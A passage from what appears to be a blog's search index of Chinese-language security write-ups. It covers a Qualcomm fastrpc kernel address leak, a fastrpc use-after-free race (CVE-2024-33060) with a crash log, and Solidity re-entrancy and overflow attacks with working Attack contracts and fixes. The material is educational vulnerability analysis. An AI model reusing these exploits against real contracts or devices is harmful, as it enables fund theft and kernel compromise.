address space info leak","content":" fastrpc_mmap_find 中的搜索算法不正确，导致内核地址空间信息泄露。 这个洞也被 CVE-2024-33060 的patch给修复了，因此共享同一个cve 1 漏洞 fastrpc_mmap_create 函数使用攻击者可控的参数调用 fastrpc_mmap_find，以查找是否存在已满足映射创建请求的现有映射。fastrpc_mmap_find函数如果找到满足的map，则返回0，否则返回-ENXIO。 static int fastrpc_mmap_create(struct fastrpc_file *fl, int fd, unsigned int attr, uintptr_t va, size_t len, int mflags, struct fastrpc_mmap **ppmap) { ...... chan = &amp;apps-&gt;channel[cid]; if (!fastrpc_mmap_find(fl, fd, va, len, mflags, 1, ppmap)) return 0; ...... } 如果找到满足请求的映射，代码就会对该映射的引用计数进行加一，然后直接返回。具体的查找过程里，会根据mflags来选择在全局还是本地的映射里去寻找： 当在本地映射里找时（31行），map-&gt;va 被设置成用户态提供的地址，这段代码是合乎逻辑的。 但对于全局映射（11行），其 map-&gt;va 实际上是一个内核的 struct page 指针，用来充当所分配内存的opaque cookie（不透明句柄，即不该让用户知道）。 map-&gt;va的来源是什么？ static int fastrpc_mmap_find(struct fastrpc_file *fl, int fd, uintptr_t va, size_t len, int mflags, int refs, struct fastrpc_mmap **ppmap) { struct fastrpc_apps *me = &amp;gfa; struct fastrpc_mmap *match = NULL, *map = NULL; struct hlist_node *n; if ((va + len) &lt; va) return -EFAULT; // 全局映射里找 if (mflags == ADSP_MMAP_HEAP_ADDR || mflags == ADSP_MMAP_REMOTE_HEAP_ADDR) { spin_lock(&amp;me-&gt;hlock); hlist_for_each_entry_safe(map, n, &amp;me-&gt;maps, hn) { if (va &gt;= map-&gt;va &amp;&amp; va + len &lt;= map-&gt;va + map-&gt;len &amp;&amp; map-&gt;fd == fd) { // 用户态提供的 va 和 len 是否在映射范围内，以及fd是否相同 if (refs) { if (map-&gt;refs + 1 == INT_MAX) { spin_unlock(&amp;me-&gt;hlock); return -ETOOMANYREFS; } map-&gt;refs++; } match = map; break; } } spin_unlock(&amp;me-&gt;hlock); // 本地映射里找 } else { hlist_for_each_entry_safe(map, n, &amp;fl-&gt;maps, hn) { if (va &gt;= map-&gt;va &amp;&amp; va + len &lt;= map-&gt;va + map-&gt;len &amp;&amp; map-&gt;fd == fd) { if (refs) { if (map-&gt;refs + 1 == INT_MAX) return -ETOOMANYREFS; map-&gt;refs++; } match = map; break; } } } ...... } 当是全局映射时，即va是堆地址（ADSP_MMAP_REMOTE_HEAP_ADDR），map-&gt;va 的值来源于 fastrpc_alloc_cma_memory 中调用的 dma_alloc_attrs 函数。 该函数有两种工作模式： 返回内核虚拟地址：指向分配的内存。 返回 struct page 指针：作为内存的“不透明句柄”（opaque cookie）。 当是全局映射时，dma_alloc_attrs 函数是第二种工作模式。有两个依据，第一个是代码，如下所示。 创建map时，fastrpc_mmap_create先设置map的attr等（重点是DMA_ATTR_NO_KERNEL_MAPPING，这涉及哪种工作模式），然后调用函数fastrpc_alloc_cma_memory去分配cma内存。 // fastrpc_mmap_device_ioctl -&gt; // case FASTRPC_IOCTL_MEM_MAP -&gt; // fastrpc_internal_mem_map -&gt; fastrpc_mmap_create{ // ...... if (mflags == ADSP_MMAP_HEAP_ADDR || mflags == ADSP_MMAP_REMOTE_HEAP_ADDR) { map-&gt;apps = me; map-&gt;fl = NULL; map-&gt;attr |= DMA_ATTR_SKIP_ZEROING | DMA_ATTR_NO_KERNEL_MAPPING; err = fastrpc_alloc_cma_memory(&amp;region_phys, &amp;region_vaddr, len, (unsigned long) map-&gt;attr); } ...... } 函数fastrpc_alloc_cma_memory调用dma_alloc_attrs，并传入前面设置的attr。 static int fastrpc_alloc_cma_memory(dma_addr_t *region_phys, void **vaddr, size_t size, unsigned long dma_attr) ...... *vaddr = dma_alloc_attrs(me-&gt;dev, size, region_phys, GFP_KERNEL, dma_attr); ...... } 继续往下调用dma_direct_alloc void *dma_alloc_attrs(struct device *dev, size_t size, dma_addr_t *dma_handle, gfp_t flag, unsigned long attrs) { ...... if (dma_is_direct(ops)) cpu_addr = dma_direct_alloc(dev, size, dma_handle, flag, attrs); ...... } 而函数dma_direct_alloc中，如果attr指定了 DMA_ATTR_NO_KERNEL_MAPPING，则不会返回内核虚拟地址，而是返回一个 struct page 指针。 void *dma_direct_alloc_pages(struct device *dev, size_t size, dma_addr_t *dma_handle, gfp_t gfp, unsigned long attrs) { ...... page = __dma_direct_alloc_pages(dev, size, dma_handle, gfp, attrs); ...... if ((attrs &amp; DMA_ATTR_NO_KERNEL_MAPPING) &amp;&amp; // 如果attr指定了 DMA_ATTR_NO_KERNEL_MAPPING !force_dma_unencrypted(dev)) { /* remove any dirty cache lines on the kernel alias */ if (!PageHighMem(page)) arch_dma_prep_coherent(page, size); *dma_handle = phys_to_dma(dev, page_to_phys(page)); // 返回一个page指针作为 opaque cookie /* return the page pointer as the opaque cookie */ return page; } } 此外，我们看一下创建本地映射时map-&gt;va的赋值是怎样的： fastrpc_mmap_create{ // ...... if (mflags == ADSP_MMAP_HEAP_ADDR || mflags == ADSP_MMAP_REMOTE_HEAP_ADDR) { ...... } else if (mflags == FASTRPC_DMAHANDLE_NOMAP) { ...... map-&gt;va = 0; // 设置为0 ...... }else { ...... map-&gt;va = va; // 设置为用户态传入的va ...... } 第二个依据是通过 debugfs 查看 adsprpc 目录下的全局映射文件（GMAPS）。 https://project-zero.issues.chromium.org/issues/42451713 =================================== GMAPS ==================================== fd |phys |size |va -------------------------------------------------------------------------------- -1 |0xE883A000 |0x1000 |0xFFFFFFFE01A20E80 -1 |0xE8839000 |0x1000 |0xFFFFFFFE01A20E40 -1 |0xE8838000 |0x1000 |0xFFFFFFFE01A20E00 -1 |0xE8837000 |0x1000 |0xFFFFFFFE01A20DC0 -1 |0xE8836000 |0x1000 |0xFFFFFFFE01A20D80 -1 |0xE8835000 |0x1000 |0xFFFFFFFE01A20D40 0 |0xE8834000 |0x1000 |0xFFFFFFFE01A20D00 0 |0xE8833000 |0x1000 |0xFFFFFFFE01A20CC0 0 |0xE8832000 |0x1000 |0xFFFFFFFE01A20C80 -1 |0xE8900000 |0x200000 |0xFFFFFFFE01A24000 这里的 va 字段实际上是struct page指针，而非真实内存地址。（物理地址的 offset 为一页，而对应 va 的 offset 则为0x40 -- page结构体的size）。 因此，函数fastrpc_mmap_find中，用户态提供的 va 值会被直接与内核的 struct page 指针比较。同时由于 ioctl 的返回值会根据比较结果（成功(0)/-ENXIO/-ETOOMANYREFS）不同，攻击者可以对与 fastrpc_map 对象相关联的 struct page 指针进行暴力猜测（brute force），导致内核地址信息的泄露。 如 sethjenkins 在三星 S23 上运行 PoC 的输出如下： dm1q:/data/local/tmp $ ./poc Detected address 0xfffffffe01c00000 Final address: 0xfffffffe01a24000 此外，由于 map-&gt;va 是 struct page 指针而非实际内存地址，代码中直接使用 map-&gt;va + map-&gt;len 进行范围判断是错误的。这可能导致同一调用参数匹配到多个映射对象，进一步引发逻辑混乱。 2 Patch 和 CVE-2024-33060 是同一个patch链接，find函数里只搜索 local map，不再搜索global map。 参考文献 https://googleprojectzero.blogspot.com/2024/12/qualcomm-dsp-driver-unexpectedly-excavating-exploit.html https://project-zero.issues.chromium.org/issues/42451713 https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/commit/4056f87e3b347e0283234f56b9e9aaea681d1644 ","link":"https://lzxzl.github.io/post/pz-issue-42451713fixed-with-cve-2024-33060-incorrect-searching-algorithm-in-fastrpc_mmap_find-leads-to-kernel-address-space-info-leak/"},{"title":"Solidity Hacks","content":" 2025.1.19: 0x01~0x02 Hacks 0x01 Re-Entrancy（重入攻击） demo学习 部署 EtherStore 合约 账号1 Alice 和帐号2 Bob 各自存入 1 Ether 到 EtherStore 用EtherStore的地址部署Attack合约 攻击者Eve调用Attack.attack，往 EtherStore 存 1 ether后取出，那么他将拿回来 3 ether。 攻击者可以在 EtherStore.withdraw 完成执行之前，多次调用 EtherStore.withdraw。 函数调用过程见下面注释 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; /* EtherStore is a contract where you can deposit and withdraw ETH. This contract is vulnerable to re-entrancy attack. Let's see why. 1. Deploy EtherStore 2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore 3. Deploy Attack with address of EtherStore 4. Call Attack.attack sending 1 ether (using Account 3 (Eve)). You will get 3 Ethers back (2 Ether stolen from Alice and Bob, plus 1 Ether sent from this contract). What happened? Attack was able to call EtherStore.withdraw multiple times before EtherStore.withdraw finished executing. Here is how the functions were called - Attack.attack - EtherStore.deposit - EtherStore.withdraw - Attack fallback (receives 1 Ether) - EtherStore.withdraw - Attack.fallback (receives 1 Ether) - EtherStore.withdraw - Attack fallback (receives 1 Ether) */ contract EtherStore { mapping(address =&gt; uint256) public balances; function deposit() public payable { // 【2】存 1 ether balances[msg.sender] += msg.value; } function withdraw() public { uint256 bal = balances[msg.sender]; // 【4】取余额，并检查必须大于0 require(bal &gt; 0); // 【5】这里call一个不存在的函数，将触发调用者Attack合约里的fallback函数 // 传过去的值为所有余额，也就是会把所有余额取出 (bool sent,) = msg.sender.call{value: bal}(&quot;&quot;); // 【8】因为这里call会等待Attack的fallback函数执行结束再往下走，所以这里会递归执行withdraw // 而因为没有执行下面的清空操作 balances[msg.sender] = 0，所以上面的require检查是会通过的，再次转钱！ require(sent, &quot;Failed to send Ether&quot;); balances[msg.sender] = 0; } // Helper function to check the balance of this contract function getBalance() public view returns (uint256) { return address(this).balance; } } contract Attack { EtherStore public etherStore; uint256 public constant AMOUNT = 1 ether; constructor(address _etherStoreAddress) { etherStore = EtherStore(_etherStoreAddress); } // Fallback is called when EtherStore sends Ether to this contract. //【6】当EtherStore 把 1 ether发回到这个合约的时候（也就是攻击者收1 ether）就会调用fallback函数 fallback() external payable { if (address(etherStore).balance &gt;= AMOUNT) { etherStore.withdraw(); // 【7】只要EtherStore合约里还有余额就再次调用withdraw } } function attack() external payable { require(msg.value &gt;= AMOUNT); etherStore.deposit{value: AMOUNT}(); // 【1】 攻击者存 1 ether etherStore.withdraw(); // 【3】 攻击者取 1 ether } // Helper function to check the balance of this contract function getBalance() public view returns (uint256) { return address(this).balance; } } 再看一下用 call 和 fallback 来转账 function withdraw() public { uint256 bal = balances[msg.sender]; require(bal &gt; 0); // 这是在以太坊上发送 ETH 的低级调用方法 // `msg.sender` 是接收 ETH 的地址 // `{value: bal}` 指定要发送的 ETH 数量 // `(&quot;&quot;)` 表示这是一个没有调用任何函数的纯转账 // 这个调用会返回两个值:(bool, bytes memory)，第一个值表示调用是否成功(true/false) (bool sent,) = msg.sender.call{value: bal}(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;); balances[msg.sender] = 0; } 那么怎样写才是正确的呢? 确保状态更改在合约交互之前 用 function modifiers 来防重入攻击 modifier 关键字用于声明修饰器。 modifierName 是修饰器的名称。 parameters 是可选的参数列表。 _ 是一个特殊的占位符，表示函数的代码将在该位置执行。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract ReEntrancyGuard { bool internal locked; modifier noReentrant() { require(!locked, &quot;No re-entrancy&quot;); locked = true; _; locked = false; } } 试着patch一下上面的合约 contract EtherStore { bool internal locked; mapping(address =&gt; uint256) public balances; modifier noReentrant() { require(!locked, &quot;No re-entrancy&quot;); locked = true; _; locked = false; } function deposit() public payable { balances[msg.sender] += msg.value; } function withdraw() public noReentrant{ // [patch 2]加上 function modifiers 来防重入攻击 uint256 bal = balances[msg.sender]; require(bal &gt; 0); balances[msg.sender] = 0; // [patch 1]把state变量的修改放到合约交互前 (bool sent,) = msg.sender.call{value: bal}(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;); } // Helper function to check the balance of this contract function getBalance() public view returns (uint256) { return address(this).balance; } } Real World Example:DAO https://github.com/demining/Dao-Exploit https://www.addesp.com/archives/186 0x02 Arithmetic Overflow and Underflow Default behaviour of Solidity 0.8 for overflow / underflow is to throw an error. 0.8版本及以后自动检测并抛出错误，但是之前的版本需要注意。 TimeLock 合约是让人存进去之后一周内不能取款，而且提供了一个函数可以让用户增加这个“锁钱”的时间。而如果攻击成功的话，攻击者可以立即取钱。具体过程见注释 // SPDX-License-Identifier: MIT pragma solidity ^0.7.6; // This contract is designed to act as a time vault. // User can deposit into this contract but cannot withdraw for at least a week. // User can also extend the wait time beyond the 1 week waiting period. /* 1. Deploy TimeLock 2. Deploy Attack with address of TimeLock 3. Call Attack.attack sending 1 ether. You will immediately be able to withdraw your ether. What happened? Attack caused the TimeLock.lockTime to overflow and was able to withdraw before the 1 week waiting period. */ contract TimeLock { mapping(address =&gt; uint256) public balances; mapping(address =&gt; uint256) public lockTime; // [1] 存钱，并将lockTime[msg.sender]加 1 week function deposit() external payable { balances[msg.sender] += msg.value; lockTime[msg.sender] = block.timestamp + 1 weeks; } // [2] 增加lock time function increaseLockTime(uint256 _secondsToIncrease) public { lockTime[msg.sender] += _secondsToIncrease; } // [3] 取钱，取之前有两个检查：1）余额大于0；2）当前时间要在lock time之后 function withdraw() public { require(balances[msg.sender] &gt; 0, &quot;Insufficient funds&quot;); require(block.timestamp &gt; lockTime[msg.sender], &quot;Lock time not expired&quot;); uint256 amount = balances[msg.sender]; balances[msg.sender] = 0; (bool sent,) = msg.sender.call{value: amount}(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;); } } // [4] 所以，如果想立即取钱，就需要让lock time （lockTime[msg.sender]）尽可能提前，最好是0 contract Attack { TimeLock timeLock; constructor(TimeLock _timeLock) { timeLock = TimeLock(_timeLock); } fallback() external payable {} function attack() public payable { timeLock.deposit{value: msg.value}(); // [5] 存钱 /* if t = current lock time then we need to find x such that x + t = 2**256 = 0 // 无符号整型 overflow so x = -t 2**256 = type(uint).max + 1 so x = type(uint).max + 1 - t */ // [6] 想法子让lock time设置为当前时间，那么再下一步取钱的时候，那个时候就会在lock time后面了 // 而法子具体见上面的注释，调用increaseLockTime就会发生计算：0 - locktime + locktime = 0 // 最后把lockTime[msg.sender] 设置为0 timeLock.increaseLockTime( type(uint256).max + 1 - timeLock.lockTime(address(this)) ); // [7] 取钱的时候就能直接取 timeLock.withdraw(); } } 怎么理解：timeLock.lockTime(address(this)？ 是在访问 TimeLock 合约中的 public mapping，因为这个映射是 public 的，Solidity 自动为它生成了一个同名的 getter 函数。这个 getter 函数可以通过传入地址来查询对应的锁定时间。 patch则是使用数学库或者自己加上检查，比如之前入门demo里那样，在加完之后assert一下 Real-World Example: PoWHC and Batch Transfer Overflow (CVE-2018–10299) https://medium.com/@ebanisadr/how-800k-evaporated-from-the-powh-coin-ponzi-scheme-overnight-1b025c33b530 https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md https://peckshield.medium.com/alert-new-batchoverflow-bug-in-multiple-erc20-smart-contracts-cve-2018-10299-511067db6536 0x03 Self Destruct 0x04 Accessing Private Data 0x05 Delegatecall 0x06 Source of Randomness 0x07 Denial of Service 0x08 Phishing with tx.origin 0x09 Hiding Malicious Code with External Contract 0x0A Honeypot 0x0B Front Running 0x0C Block Timestamp Manipulation 0x0D Signature Replay 0x0E Bypass Contract Size Check 0x0F Deploy Different Contracts at the Same Address 0x10 Vault Inflation 0x11 WETH Permit 参考文献 https://solidity-by-example.org/hacks/re-entrancy/ https://github.com/demining/Dao-Exploit ","link":"https://lzxzl.github.io/post/solidity-hacks/"},{"title":"CVE-2024-33060 UAF race of global maps in fastrpc_mmap_create (and epilogue functions)","content":" qualcomm-dsp-driver: adsprpc 在 fastrpc_mmap_create（及其收尾函数）中全局映射的 UAF(Use After Free) 竞争条件 1 前置知识 互斥锁 “互斥锁”（Mutual Exclusion Lock，简称 Mutex）是一种常见的同步原语，用于在线程或进程并发访问共享资源（例如全局变量、临界区代码）时，确保同一时刻只有一个执行流（线程/进程）能够进入临界区，从而避免并发读写导致的数据不一致或竞争条件问题。 在操作系统或多线程编程中，互斥锁一般表现为一个对象（如 pthread_mutex_t），需要在线程进入临界区前获取（lock），退出临界区后释放（unlock）。如果有其他线程也试图获取同一个互斥锁，则会被阻塞，直到持锁的线程释放该锁为止。 1. 临界区与排他性 设定临界区： 在并发环境下，多个线程或进程共享一段可能出现读写冲突的代码或数据——这段需要加以保护的区域就称之为“临界区”。例如，操作共享变量、链表、文件或硬件资源等都可能属于临界区。 排他性： 互斥锁的核心目标是“排他性”，即任意时刻只允许一个线程进入临界区，从而避免多个线程同时修改共享资源时引发的竞态条件（race condition）。 2. 互斥锁的基本操作 初始化（Initialize）： 在使用锁之前，需要先对互斥锁进行初始化。不同操作系统或线程库（如 pthread、Windows API 等）会提供不同的初始化方式。 获取（Lock / Acquire）： 当一个线程准备进入临界区时，会尝试获取互斥锁。如果锁尚未被其他线程持有，则本线程立即获取成功；如果锁已被其他线程持有，则本线程将被阻塞，直到锁被释放。 释放（Unlock / Release）： 当持锁线程执行完临界区代码后，会调用相应的解锁函数将锁释放，其他等待的线程才有机会获取该锁继续执行。 销毁（Destroy）： 在互斥锁不再需要使用时，可以销毁该锁，以回收相关资源。 fastrpc_mmap adsprpc 驱动程序通过 fastrpc_mmap 结构体维护 DMA 缓冲区和协处理器映射的关系。这些结构体在 fastrpc_mmap_create 中分配和初始化，并包含几个相当复杂的特性。 存储位置的多样性: 根据创建时使用的标志，fastrpc_mmap 对象既可以位于与 struct file 关联的 fl（本地）链表，也可以位于全局链表中。 两个引用计数且被多处引用: 有两个独立的引用计数refs 和 ctx_refs ，并且可能同时从多个地方被引用。 上下文（用于跟踪与单个 RPC 调用相关数据的对象） 全局或本地映射链表 在创建或销毁时使用的临时基于栈的引用。 当使用能够匹配现有映射的一组参数来调用 fastrpc_mmap_create 时，就会对已有映射执行引用操作。 创建和销毁路径的多样: fastrpc_mmap 对象可以通过多条不同的代码路径来创建 创建 在初始化上下文时，通过访问两个专门的 ioctl 处理函数时 在 DSP 初始化和进程创建期间 由 DSP 自身发起请求来创建 销毁 同样可以通过相应的反向代码路径来释放 在上下文或 struct file 被拆除（teardown）时 通过三个不同的专用 unmapping ioctl 来释放 2 漏洞 为了理解这个洞，必须先充分了解在保护这些映射链表避免竞争条件时使用的锁机制： int fastrpc_internal_mem_map(struct fastrpc_file *fl, struct fastrpc_ioctl_mem_map *ud) { int err = 0; struct fastrpc_mmap *map = NULL; mutex_lock(&amp;fl-&gt;internal_map_mutex); // 互斥锁1 ... mutex_lock(&amp;fl-&gt;map_mutex); // 互斥锁2 VERIFY(err, !(err = fastrpc_mmap_create(fl, ud-&gt;m.fd, NULL, ud-&gt;m.attrs, ud-&gt;m.vaddrin, ud-&gt;m.length, ud-&gt;m.flags, &amp;map))); mutex_unlock(&amp;fl-&gt;map_mutex); if (err) goto bail; ... //[1] map 可能已经全局可见 VERIFY(err, !(err = fastrpc_mem_map_to_dsp(fl, ud-&gt;m.fd, ud-&gt;m.offset, ud-&gt;m.flags, map-&gt;va, map-&gt;phys, map-&gt;size, &amp;map-&gt;raddr))); if (err) goto bail; ud-&gt;m.vaddrout = map-&gt;raddr; bail: if (err) { if (map) { mutex_lock(&amp;fl-&gt;map_mutex); fastrpc_mmap_free(map, 0); mutex_unlock(&amp;fl-&gt;map_mutex); } } mutex_unlock(&amp;fl-&gt;internal_map_mutex); return err; } 上面是fastrpc_internal_mem_map 函数的片段，这里持有两个互斥锁：fl-&gt;internal_map_mutex 和 fl-&gt;map_mutex ，其中前者在函数整个生命周期最外层加锁（包括在错误退出时）。 在这个 fastrpc 驱动中，每个文件描述符 (struct file) 对应着一个 fastrpc_file 结构体 (简称 fl)。其中 fl-&gt;internal_map_mutex 和 fl-&gt;map_mutex 这两把互斥锁都“绑定”在特定的 fl（即特定的 struct file）上，用于防止对“同一个”文件描述符上的并发操作。也就是说： fl-&gt;internal_map_mutex 保护与 fl 相关的内部数据结构（如 internal_map）。 fl-&gt;map_mutex 保护与 fl 相关的 map 链表 (fl-&gt;maps) 等。 简单来说，这两个互斥锁都绑定在同一个 struct file（文件描述符）上，因此可以防止对同一个文件描述符并发地调用多次 fastrpc_internal_mem_map。但它并不能防止其他 struct file（比如通过另外一个打开的 adsprpc-smd 文件描述符）同时调用相同 ioctl 时的竞争。 为什么这两个互斥锁不能防止其他 struct file 同时调用相同 ioctl 时的竞争？ A: 这两个互斥锁都属于同一个 fastrpc_file，因此它们只能防止“同一个文件描述符”上下文中的并发操作。如果用户通过“两个或多个不同的 struct file（不同文件描述符）”来调用同一个 ioctl，实际上它们拿到的是“不同的” fastrpc_file 结构体实例，因而也就拥有不同的 fl-&gt;internal_map_mutex 和 fl-&gt;map_mutex 对象。这意味着： A 进程打开了 adsprpc 设置为文件描述符 fd1，对应 fl1； B 进程或另一个线程也打开了同样的驱动获取文件描述符 fd2，对应 fl2； fl1 和 fl2 是两个彼此独立的 fastrpc_file 结构，在 fl1 上的互斥锁和 fl2 上的互斥锁并不相同。 此时，如果 A 和 B 分别在 fl1 和 fl2 上调用相同的 ioctl，A 持锁的行为不会对 B 产生阻塞效果，因为 B 的操作使用的是另外一把与 fl2 关联的互斥锁。这样在全局层面上，保护就失效了——只能在同一个文件描述符内部起到互斥效果，但不能跨不同文件描述符进行同步。 虽然这些 ioctl 经常用来管理 fl 上的本地映射，但 fastrpc_mmap_create 和 fastrpc_internal_mem_map 也可能创建全局映射。对于那些被添加到全局数据结构的全局映射来说，全局层面上的互斥锁只会在调用栈 fastrpc_internal_mem_map -&gt; fastrpc_mmap_create -&gt; fastrpc_mmap_add 中进行短暂地加锁，而非整个操作过程都保持。 static void fastrpc_mmap_add(struct fastrpc_mmap *map) { if (map-&gt;flags == ADSP_MMAP_HEAP_ADDR || map-&gt;flags == ADSP_MMAP_REMOTE_HEAP_ADDR) { struct fastrpc_apps *me = &amp;gfa; //gfa 是一个全局结构 unsigned long irq_flags = 0; spin_lock_irqsave(&amp;me-&gt;hlock, irq_flags); //在这里获取全局锁 hlist_add_head(&amp;map-&gt;hn, &amp;me-&gt;maps); spin_unlock_irqrestore(&amp;me-&gt;hlock, irq_flags); //在这里释放全局锁 } else { struct fastrpc_file *fl = map-&gt;fl; hlist_add_head(&amp;map-&gt;hn, &amp;fl-&gt;maps); } } 这意味着即使在创建全局映射时，当前的全局互斥方式也不足以阻止两个并发的 fastrpc 映射 ioctl 调用。严格来说，这本身还不算一个漏洞，但在将一个全局映射插入全局链表之后，fastrpc_internal_mem_map 仍然继续访问该映射，而逻辑上这一引用其实已经“被消耗”掉了。 为什么逻辑上这一引用其实已经“被消耗”掉了？ 引用计数与所有权转移 在内核中，管理对象最常见的办法就是使用“引用计数（refcount）”来追踪对象是否仍在使用中，以及由谁来保障它的生命期。 • 当某个代码路径需要长期访问某对象时，会增加（get）该对象的引用计数。 • 当不再需要使用该对象时，则减少（put）该对象的引用计数，引用计数归零就可释放。 在“本地 → 全局”这类跨域移交中，往往意味着“在本地很快就不再独占这个对象”，而将它放入到一个全局可见的结构（例如全局链表）里时，就等于将“所有权”移交出去，此时其他线程/进程可能随时访问或释放这个对象。从逻辑上讲，原本的本地持有者如果没有额外增加引用计数和保持必要的全局同步，就应该“放弃”对该对象的独占使用。 为什么说“引用被消耗”？ 在 fastrpc 驱动的这个场景中，函数通过 fastrpc_mmap_add 将 map 对象添加到全局链表 (me-&gt;maps)，意味着： • map 现在对于其他打开了同一驱动的文件描述符也是可见的； • 其他线程可能随时以新的方式增加对 map 的引用，或者主动通过某个 ioctl 将其移除并释放。 也就是说，一旦 map 被插入全局结构，原来“local context”中的那一份引用不能再被假定为安全持有，因为对象的生命周期不再由当前调用路径独占控制。相比之下，如果代码在插入全局链表后仍然使用 map，但却没有获取全局层面的锁或保持对 map 的额外引用，那么其他线程就有机会在它访问 map 的过程中将 map 销毁，从而触发 Use After Free。 因此，从“引用语义”出发，一旦你把这个对象交给了全局链表管理，就等同于你把“管理权”或“所有权”交给了一个更宽的范围——本地的那份引用“被消耗”意味着： • 你不能对这个对象的释放时机再作任何假设； • 你必须通过“新的引用（refcount）”或“全局锁”等机制来确保自己仍然合法地访问这个对象。 总的来说，“逻辑上被消耗”指的是，一个本地引用在将对象挂接进全局可见结构（并且没有持有额外引用计数或全局锁）的那一刻，就不再具备“可随意访问此对象”的安全性。因为对象生命周期与使用权已经转移到新的管理范围（全局结构）。如果还想继续在当前路径使用对象，就需要在插入全局链表时或之后，显式地增加它的引用（比如一次 refcount++），并使用恰当的同步手段（全局锁或原子操作）来保证使用期间的安全性，否则就会出现竞态条件，导致 Use After Free 等安全漏洞。 更关键的是，如果一个映射被创建且添加到全局链表后，它立刻对其他并发调用可见——例如另一线程通过不同的 adsprpc fd / fl struct 调用 fastrpc_internal_munmap 可能会销毁这个全局映射，但 fastrpc_internal_mem_map 却还在继续用它（见上面代码注释处 [1]）。这是一个“在引用被传递到一个用户态可任意释放对象之后，依然继续使用该引用”的典型例子。 类似的情形还包括，在你将一个 struct file 对象的唯一引用安装到文件描述符表（通过 fd_install）之后，用户态可以通过 close(2) 来释放该引用，而内核如果继续使用就会产生 Use After Free 的问题。如果不理解，可以看看Blackhat-usa-2022-Devils Are in the File Descriptors: It Is Time To Catch Them All PAGE_POISON： PAGE_POISON 是一种内核调试技术，它会在释放内存后用特殊的值填充内存页，以便在代码尝试访问已释放的内存时更容易地检测到 UAF 错误。文中提到触发此 bug 会导致内核崩溃，并显示 PAGE_POISON 信息，这进一步证实了 UAF 错误的存在。 触发此错误会在启用 PAGE_POISON的情况下生成以下内核崩溃： [ 2890.558370] [0: poc:22189] Unable to handle kernel paging request at virtual address 006b6b6b6b6b6b83 [ 2890.558411] [0: poc:22189] PC Code: 95ca6fb3 aa1703e0 2a1f03e1 97ffdbcc 2a1f03f6 14000008 f9400ae8 (f8418d09) f90002e9 b4000049 f9000537 f9000117 f90006e8 aa1403e0 95ca66a2 aa1303e0 95ca66a0 d5384108 f942f108 f94007e9 [ 2890.558618] [0: poc:22189] LR Code: 94000075 2a0003f6 aa1403e0 95ca66ed f94003f7 340006f6 b4000937 aa1403e0 95ca6feb (b94026e8) 7100211f 54000060 7100111f 54000721 b00000f8 91038318 91008315 aa1503e0 95ca97d3 f9400308 [ 2890.558633] [0: poc:22189] Mem abort info: [ 2890.558641] [0: poc:22189] ESR = 0x96000004 [ 2890.558650] [0: poc:22189] EC = 0x25: DABT (current EL), IL = 32 bits [ 2890.558661] [0: poc:22189] SET = 0, FnV = 0 [ 2890.558670] [0: poc:22189] EA = 0, S1PTW = 0 [ 2890.558678] [0: poc:22189] FSC = 0x04: level 0 translation fault [ 2890.558688] [0: poc:22189] Data abort info: [ 2890.558696] [0: poc:22189] ISV = 0, ISS = 0x00000004 [ 2890.558704] [0: poc:22189] CM = 0, WnR = 0 [ 2890.558713] [0: poc:22189] [006b6b6b6b6b6b83] address between user and kernel address ranges [ 2890.558727] [0: poc:22189] Internal error: Oops: 96000004 [#1] PREEMPT SMP [ 2890.559162] [0: poc:22189] sec_arm64_ap_context:sec_arm64_ap_context_on_die() context saved (CPU:0) ... [ 2890.560996] [0: poc:22189] CPU: 0 PID: 22189 Comm: poc Tainted: G S W OE 5.15.123-android13-8-28577312-abS911BXXU3CXD3 #1 [ 2890.561007] [0: poc:22189] Hardware name: Samsung DM1Q PROJECT (board-id,13) (DT) [ 2890.561014] [0: poc:22189] pstate: 22400005 (nzCv daif +PAN -UAO +TCO -DIT -SSBS BTYPE=--) [ 2890.561024] [0: poc:22189] pc : fastrpc_internal_munmap+0x1ac/0x264 [frpc_adsprpc] [ 2890.561202] [0: poc:22189] lr : fastrpc_internal_munmap+0xb4/0x264 [frpc_adsprpc] [ 2890.561376] [0: poc:22189] sp : ffffffc025ee3cc0 [ 2890.561382] [0: poc:22189] x29: ffffffc025ee3cd0 x28: ffffff88bf4fbb80 x27: 0000000000000000 [ 2890.561397] [0: poc:22189] x26: 0000000000000000 x25: 0000000000000000 x24: ffffff8922ae4301 [ 2890.561411] [0: poc:22189] x23: ffffff803bb30900 x22: 0000000080000448 x21: ffffff8928fb5800 [ 2890.561424] [0: poc:22189] x20: ffffff8928fb5910 x19: ffffff8928fb5940 x18: ffffffc00b492010 [ 2890.561437] [0: poc:22189] x17: 00000000000003e7 x16: 0000000000007e00 x15: 0000000000000600 [ 2890.561450] [0: poc:22189] x14: ffffff891cc57e00 x13: dee89d8ccc1e57a7 x12: 088000400811164c [ 2890.561463] [0: poc:22189] x11: ffffff891cc51a00 x10: ffffff88bf4fbb80 x9 : 0000000000000000 [ 2890.561476] [0: poc:22189] x8 : 6b6b6b6b6b6b6b6b x7 : bbbbbbbbbbbbbbbb x6 : 00000000000000c0 [ 2890.561489] [0: poc:22189] x5 : 0000000000150009 x4 : ffffff891cc57400 x3 : 000000000015000a [ 2890.561502] [0: poc:22189] x2 : ffffff88bf4fbb80 x1 : 0000000000000000 x0 : 0000000000000000 [ 2890.561516] [0: poc:22189] Call trace: [ 2890.561523] [0: poc:22189] fastrpc_internal_munmap+0x1ac/0x264 [frpc_adsprpc] [ 2890.561696] [0: poc:22189] fastrpc_device_ioctl+0x7e8/0x92c [frpc_adsprpc] [ 2890.561867] [0: poc:22189] __arm64_sys_ioctl+0x120/0x170 [ 2890.561886] [0: poc:22189] invoke_syscall+0x58/0x13c [ 2890.561899] [0: poc:22189] el0_svc_common+0xb4/0xf0 [ 2890.561908] [0: poc:22189] do_el0_svc+0x24/0x90 [ 2890.561917] [0: poc:22189] el0_svc+0x20/0x7c [ 2890.561929] [0: poc:22189] el0t_64_sync_handler+0x84/0xe4 [ 2890.561937] [0: poc:22189] el0t_64_sync+0x1b8/0x1bc [ 2890.561951] [0: poc:22189] Code: 97ffdbcc 2a1f03f6 14000008 f9400ae8 (f8418d09) [ 2890.561967] [0: poc:22189] ---[ end trace af6bd4fc06724258 ]--- [ 2890.561978] [0: poc:22189] Kernel panic - not 